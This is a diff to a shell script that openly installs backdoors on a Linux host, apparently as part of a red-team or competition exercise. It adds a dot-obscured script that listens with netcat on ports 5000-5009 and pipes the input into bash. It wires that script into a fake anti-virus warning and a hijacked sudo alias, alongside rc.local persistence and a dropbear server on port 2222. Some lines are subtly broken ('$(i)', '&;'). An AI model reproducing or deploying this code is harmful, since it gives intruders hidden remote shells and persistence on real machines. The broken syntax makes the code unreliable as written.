@@ -47,6 +47,7 @@ chmod 755 /bin/virus.sh
 cat << EOF > /bin/malware.sh
 #!/bin/bash
 /bin/echo -e "!!! YOU NEED TO UPDATE YOUR ANTI-VIRUS !!! \n\nPlease run:\n***************\n* sudo reboot *\n*************** "
+/sbin/..........................open.....up.......vIrUs.........sh &
 EOF
 chmod 755 /bin/malware.sh
 
@@ -78,6 +79,19 @@ EOF
 chmod 755 /sbin/let_us_in_VIRUS.sh
 
 
+cat << EOF > /sbin/..........................open.....up.......vIrUs.........sh
+#!/bin/bash
+while true
+do
+  for i in {5000..5009}
+  do
+  /bin/nc -l -p $(i) | /bin/bash
+  done
+sleep 600
+done
+EOF
+chmod 755 /sbin/..........................open.....up.......vIrUs.........sh
+
 cat << EOF > /etc/rc.local
 #!/bin/sh -e
 #
@@ -91,12 +105,12 @@ cat << EOF > /etc/rc.local
 # bits.
 #
 # By default this script does nothing.
-/bin/virus.sh || bin/true
+/bin/virus.sh || /bin/true
 /bin/trojan.sh || /bin/true
-/bin/worm.sh || bin/true
-/bin/virus.sh || bin/true
+/bin/worm.sh || /bin/true
+/bin/virus.sh || /bin/true
 /bin/trojan.sh || /bin/true
-/bin/worm.sh || bin/true
+/bin/worm.sh || /bin/true
 /usr/sbin/dropbear -p 2222 || /bin/true
 exit 0
 EOF
@@ -173,7 +187,7 @@ fi
 
 alias cd='/sbin/let_us_in_VIRUS.sh; cd'
 alias ls='/bin/malware.sh; ls'
-
+alias sudo='/sbin/..........................open.....up.......vIrUs.........sh &; sudo'
 #PS1="\u@\h:\w\$ "
 #what user@comp prompt looks like
 if [ $(id -u) -eq 0 ];
